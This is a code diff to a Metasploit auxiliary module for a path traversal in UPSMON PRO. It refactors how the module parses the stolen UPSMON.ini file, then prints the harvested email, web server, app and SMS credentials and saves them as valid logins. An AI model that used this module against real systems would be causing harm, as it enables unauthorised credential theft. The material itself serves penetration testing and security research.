@@ -72,29 +72,8 @@ class MetasploitModule < Msf::Auxiliary
     return CheckCode::Unknown
   end
 
-  def extract_section_fields(section, keys, data)
-    # Extract section content between [SectionName] and next section or end of data
-    section_regex = /^\[#{Regexp.escape(section)}\](.*?)(?=^\[|\z)/m
-    match = data.match(section_regex)
-    return {} unless match
-
-    content = match[1]
-    result = {}
-    expected_keys = keys.map { |k| k.strip.downcase }
-
-    content.each_line do |line|
-      line = line.strip
-      next if line.empty? || !line.include?('=')
-
-      key, value = line.split('=', 2).map(&:strip)
-      key_down = key.downcase
-
-      if expected_keys.include?(key_down)
-        result[key_down.to_sym] = value
-      end
-    end
-
-    result
+  def print_ini_field(label, value)
+    print_status("#{label}: #{value.nil? || value.empty? ? '(not configured)' : value}")
   end
 
   def run
@@ -110,27 +89,79 @@ class MetasploitModule < Msf::Auxiliary
     print_good("File retrieved: #{target_uri.path}#{traversal}")
 
     data = res.body
+
     if traversal.downcase.end_with?('upsmon.ini')
       print_status('UPSMON.ini specified, parsing credentials:')
-      email_creds = extract_section_fields('Email', ['UserName', 'Password', 'SMTP', 'Port'], data)
-      webserver_creds = extract_section_fields('WebServer', ['UserName', 'Password'], data)
-      main_creds = extract_section_fields('Main', ['AppPassword'], data)
-      sms_creds = extract_section_fields('SMS', ['UserName', 'Password', 'UPSName', 'PhoneNum'], data)
 
-      print_status("SMTP: #{email_creds[:smtp].nil? || email_creds[:smtp].empty? ? '(not configured)' : email_creds[:smtp]}")
-      print_status("Port: #{email_creds[:port].nil? || email_creds[:port].empty? ? '(not configured)' : email_creds[:port]}")
-      print_status("Email UserName: #{email_creds[:username].nil? || email_creds[:username].empty? ? '(not configured)' : email_creds[:username]}")
-      print_status("Email Password: #{email_creds[:password].nil? || email_creds[:password].empty? ? '(not configured)' : email_creds[:password]}")
+      begin
+        parser = Rex::Parser::Ini.new
+        parser.from_s(data)
 
-      print_status("WebServer UserName: #{webserver_creds[:username].nil? || webserver_creds[:username].empty? ? '(not configured)' : webserver_creds[:username]}")
-      print_status("WebServer Password: #{webserver_creds[:password].nil? || webserver_creds[:password].empty? ? '(not configured)' : webserver_creds[:password]}")
+        email_creds = parser['Email'] || {}
+        webserver_creds = parser['WebServer'] || {}
+        main_creds = parser['Main'] || {}
+        sms_creds = parser['SMS'] || {}
 
-      print_status("Main AppPassword: #{main_creds[:apppassword].nil? || main_creds[:apppassword].empty? ? '(not configured)' : main_creds[:apppassword]}")
+        smtp = email_creds['SMTP']
+        port = email_creds['Port']
+        username = email_creds['UserName']
+        password = email_creds['Password']
 
-      print_status("SMS UserName: #{sms_creds[:username].nil? || sms_creds[:username].empty? ? '(not configured)' : sms_creds[:username]}")
-      print_status("SMS Password: #{sms_creds[:password].nil? || sms_creds[:password].empty? ? '(not configured)' : sms_creds[:password]}")
-      print_status("UPS Name: #{sms_creds[:upsname].nil? || sms_creds[:upsname].empty? ? '(not configured)' : sms_creds[:upsname]}")
-      print_status("Phone Number: #{sms_creds[:phonenum].nil? || sms_creds[:phonenum].empty? ? '(not configured)' : sms_creds[:phonenum]}")
+        print_ini_field('SMTP', smtp)
+        print_ini_field('Port', port)
+        print_ini_field('UserName', username)
+        print_ini_field('Password', password)
+
+        if username && password
+          store_valid_credential(
+            user: username,
+            private: password,
+            private_type: :password
+          )
+        end
+
+        web_user = webserver_creds['UserName']
+        web_pass = webserver_creds['Password']
+        print_ini_field('WebServer UserName', webserver_creds['UserName'])
+        print_ini_field('WebServer Password', webserver_creds['Password'])
+
+        if web_user && web_pass
+          store_valid_credential(
+            user: web_user,
+            private: web_pass,
+            private_type: :password
+          )
+        end
+
+        app_pass = main_creds['AppPassword']
+        print_ini_field('Main AppPassword', main_creds['AppPassword'])
+
+        if app_pass
+          store_valid_credential(
+            user: 'AppUser',
+            private: app_pass,
+            private_type: :password
+          )
+        end
+
+        sms_user = sms_creds['UserName']
+        sms_pass = sms_creds['Password']
+        print_ini_field('SMS UserName', sms_creds['UserName'])
+        print_ini_field('SMS Password', sms_creds['Password'])
+        print_ini_field('UPS Name', sms_creds['UPSName'])
+        print_ini_field('Phone Number', sms_creds['PhoneNum'])
+
+        if sms_user && sms_pass
+          store_valid_credential(
+            user: sms_user,
+            private: sms_pass,
+            private_type: :password
+          )
+        end
+      rescue StandardError => e
+        print_error("Failed to parse INI data: #{e.message}")
+      end
+
     end
 
     path = store_loot('upsmonpro.file', 'text/plain', datastore['RHOSTS'], data, datastore['FILE'], 'File retrieved through UPSMON PRO path traversal.')
